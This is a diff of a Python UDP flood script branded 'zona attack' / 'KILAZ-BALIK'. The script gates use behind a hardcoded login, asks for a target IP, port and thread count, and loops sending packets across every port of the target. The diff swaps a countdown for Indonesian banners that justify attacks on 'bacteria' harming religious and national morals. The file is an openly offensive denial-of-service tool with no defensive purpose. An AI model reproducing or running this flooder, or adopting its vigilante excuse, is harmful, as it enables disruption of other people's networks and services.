@@ -52,7 +52,7 @@ while attemps < 100:
     password = input('\033[94mEnter your password: \033[0m')
 
     if username == 'k0l4pz' and password == 'k0l4pz':
-        print('welcome to zona attack!!')
+        print('\033[31mWELCOME TO ZONA ATTACK!!\033[0m')
         break
     else:
         print('Incorrect credentials. Check if you have Caps lock on and try again.')
@@ -62,21 +62,19 @@ while attemps < 100:
 
 ip = str(input("\033[94mTarget IP :  \033[0m"))
 port = int(input("\033[97mTarget Port :  \033[0m"))
-choice = str(input("\033[31m(y/n) :  \033[0m"))
-times = int(input("\033[96mTime : \033[0m"))
 threads = int(input("\033[92mThreads :  \033[0m"))
 time.sleep(5),
-print("\033[96m               ⟩⟩  Minus 5 \033[0m "),
+print("\033[96m  ⟩⟩  SCRIPT INI... \033[0m "),
 time.sleep(5),
-print("\033[92m               ⟩⟩  Minus 4 \033[0m "),
+print("\033[92m  ⟩⟩  HANYA BOLEH KAU GUNAKAN \033[0m "),
 time.sleep(5),
-print("\033[1m               ⟩⟩  Minus 3 \033[0m "),
+print("\033[1m  ⟩⟩  UNTUK MEMBERANTAS \033[0m "),
 time.sleep(5),
-print("\033[97m               ⟩⟩  Minus 2 \033[0m "),
+print("\033[97m  ⟩⟩  BAKTERI YG MERUGIKAN KEHIDUPAN \033[0m "),
 time.sleep(5),
-print("\033[95m               ⟩⟩  Minus 1 \033[0m "),
+print("\033[95m  ⟩⟩  MERUSAK MORAL AGAMA & BANGSA \033[0m "),
 time.sleep(5),
-print("\033[92m               ⟩⟩  G0....!! \033[0m "),
+print("\033[92m  ⟩⟩  SERTA MEMBELA YG TERTINDAS..! \033[0m "),
 time.sleep(5),
 
 sent = 0
@@ -84,7 +82,7 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print(f"\033[97m[💥\033[99m KILAZ-BALIK\033[97m]   Sent  \033[33mPacket:::.... " +ip+ "\033[0m" )
-     print(f"\033[93m[💥\033[99m KILAZ-BALIK\033[93m]   Attack  \033[1mThread:::.... " +ip+ "\033[0m" )
+     print(f"\033[97m[🧨\033[99m KILAZ-BALIK\033[97m]   Sent  \033[33mPacket:::.... " +ip+ "\033[0m" )
+     print(f"\033[93m[🧨\033[99m KILAZ-BALIK\033[93m]   Attack  \033[1mThread:::.... " +ip+ "\033[0m" )
      if port == 65534:
        port = 1
